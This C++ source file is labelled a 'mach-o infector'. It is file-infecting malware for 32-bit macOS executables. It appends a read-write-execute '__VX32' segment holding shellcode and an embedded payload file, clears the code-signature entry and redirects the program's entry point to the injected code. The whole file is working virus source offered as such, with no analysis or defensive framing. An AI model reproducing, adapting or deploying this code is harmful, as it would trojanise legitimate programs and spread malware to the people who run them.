//
//  infect32.cpp
//  mach-o infector
//
//  Created by Pest on 27.11.14.
//  Copyright (c) 2014 coru.ws. All rights reserved.
//

#include "infect32.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <mach-o/loader.h>
#include "sc32.h"

static uint64_t align(uint64_t x,uint64_t y){
    return (x+(y-1))&(~(y-1));
}


static uint32 atorva32(uint8 *buf,uint32 size,uint32 a){
    uint8 *pen=buf+size;
    uint8 *p=buf;
    mach_header *h=(mach_header*)p;
    p+=sizeof(mach_header);
    if (p>pen)
        return -1;
    
    if (h->magic!=MH_MAGIC)
        return -1;
    if (h->filetype!=MH_EXECUTE)
        return -1;
    load_command *lc;
    for (int i=0;i<h->ncmds;i++){
        lc=(load_command*)p;
        if ((p+sizeof(load_command))>pen)
            return -1;
        p+=lc->cmdsize;
        if (p>pen)
            return -1;
        if (lc->cmd==LC_SEGMENT){
            segment_command *sg=(segment_command*)lc;
            if (sg->fileoff<=a && a<(sg->fileoff+sg->filesize)){
                return sg->vmaddr+(a-sg->fileoff);
            }
        }
    }
    
    return -1;
}


static uint32 rvatoa32(uint8 *buf,uint32 size,uint32 rva){
    uint8 *pen=buf+size;
    uint8 *p=buf;
    mach_header *h=(mach_header*)p;
    p+=sizeof(mach_header);
    if (p>pen)
        return -1;
    
    if (h->magic!=MH_MAGIC)
        return -1;
    if (h->filetype!=MH_EXECUTE)
        return -1;
    load_command *lc;
    for (int i=0;i<h->ncmds;i++){
        lc=(load_command*)p;
        if ((p+sizeof(load_command))>pen)
            return -1;
        p+=lc->cmdsize;
        if (p>pen)
            return -1;
        if (lc->cmd==LC_SEGMENT){
            segment_command *sg=(segment_command*)lc;
            if (sg->vmaddr<=rva && rva<(sg->vmaddr+sg->vmsize)){
                return sg->fileoff+(rva-sg->vmaddr);
            }
        }
    }
    
    return -1;
}


bool add_section32(uint8 *buf,uint32 size,uint32 sizevirus,uint32 &padding,uint32 &oep,uint32 &vep){
    uint8 *pen=buf+size;
    uint8 *p=buf;
    mach_header *h=(mach_header*)p;
    p+=sizeof(mach_header);
    if (p>pen)
        return false;
    
    if (h->magic!=MH_MAGIC)
        return false;
    if (h->filetype!=MH_EXECUTE)
        return false;
    load_command *lc;
    segment_command *min=0,*max=0;
    _STRUCT_X86_THREAD_STATE32 *lc_unixthread=0;
    entry_point_command *lc_main=0;
    linkedit_data_command *lc_sign=0;
    for (int i=0;i<h->ncmds;i++){
        lc=(load_command*)p;
        if ((p+sizeof(load_command))>pen)
            return false;
        p+=lc->cmdsize;
        if (p>pen)
            return false;
        if (lc->cmd==LC_UNIXTHREAD){
            x86_state_hdr *h=(x86_state_hdr*)(lc+1);
            if (h->flavor==x86_THREAD_STATE32){
                lc_unixthread=(_STRUCT_X86_THREAD_STATE32 *)(h+1);
                
            }
        }
        
        if (lc->cmd==LC_MAIN){
            lc_main=(entry_point_command*)lc;
        }

       if (lc->cmd==LC_CODE_SIGNATURE){
            lc_sign=(linkedit_data_command*)lc;
        }        
        
        if (lc->cmd==LC_SEGMENT){
            segment_command *sg=(segment_command*)lc;
            if (sg->filesize>0){
                if (!min){
                    min=sg;
                }
                if (!max){
                    max=sg;
                }
                if (sg->fileoff>max->fileoff){
                    max=sg;
                }
                if (sg->fileoff<min->fileoff){
                    min=sg;
                }
                
            }
        }
    }
    
    if (!min || !max || (!lc_unixthread && !lc_main))
        return false;
    
    section *sec=(section*)((uint8*)min+sizeof(segment_command));
    section *minsec=sec;
    for (int j=0;j<min->nsects;j++){
        if (sec[j].offset<minsec->offset)
            minsec=&sec[j];
    }
    
    int lenfree=minsec->offset-(h->sizeofcmds+sizeof(mach_header));
    if (lenfree<(sizeof(segment_command)+sizeof(section)))
        return false;
    
    padding=align(max->fileoff+max->filesize,0x1000)-(max->fileoff+max->filesize);
    lc_sign->dataoff=0;
    lc_sign->datasize=0;    
    //patching headers
    h->ncmds++;
    segment_command *sg=(segment_command*)((uint8*)h+h->sizeofcmds+sizeof(mach_header));
    h->sizeofcmds+=sizeof(segment_command)+sizeof(section);
    memset(sg,0,sizeof(segment_command));
    sec=(section*)(sg+1);
    memset(sec,0,sizeof(section));
    sg->cmd=LC_SEGMENT;
    sg->cmdsize=sizeof(segment_command)+sizeof(section);
    strcpy(sg->segname,"__VX32");
    sg->vmaddr=align(max->vmaddr+max->vmsize,0x1000);
    sg->vmsize=sizevirus;
    sg->fileoff=align(max->fileoff+max->filesize,0x1000);
    sg->filesize=sizevirus;
    sg->maxprot=sg->initprot=VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE;
    sg->nsects=1;
    strcpy(sec->sectname,"__vx32");
    strcpy(sec->segname,"__VX32");
    sec->addr=sg->vmaddr;
    sec->size=sizevirus;
    sec->offset=sg->fileoff;
    sec->align=0;
    sec->flags=S_REGULAR;
    if (lc_unixthread){
        oep=lc_unixthread->__eip;
        vep=lc_unixthread->__eip=sg->vmaddr;
    }
    
    if (lc_main){
        oep=lc_main->entryoff+min->vmaddr;
        vep=sg->vmaddr;
        lc_main->entryoff=sg->vmaddr-min->vmaddr;
    }
    return true;
}

#pragma pack(push,1)
struct tconfig{
    uint32 oep;
    uint32 size;
};
#pragma pack(pop)

bool infect32(uint8 *&buf,uint32 &size,uint8 *file,uint32 lfile){
    uint8 *shell=(uint8*)sc32;
    uint32 lshell=sizeof(sc32)-1;
    tconfig *c=(tconfig*)(sc32+lshell-sizeof(tconfig));
    c->size=lfile;
    
    uint32 padding,oep,vep,lsec;
    lsec=lshell+lfile;
    if (!add_section32(buf,size,lsec,padding,oep,vep))
        return false;
    uint8 *bnew=(uint8*)malloc(size+padding+lsec);
    if (!bnew)
        return false;
    memcpy(bnew,buf,size);
    c->oep=vep-oep;
    memcpy(bnew+size+padding,shell,lshell);
    memcpy(bnew+size+padding+lshell,file,lfile);
    free(buf);
    buf=bnew;
    size=size+padding+lsec;
    return true;
}


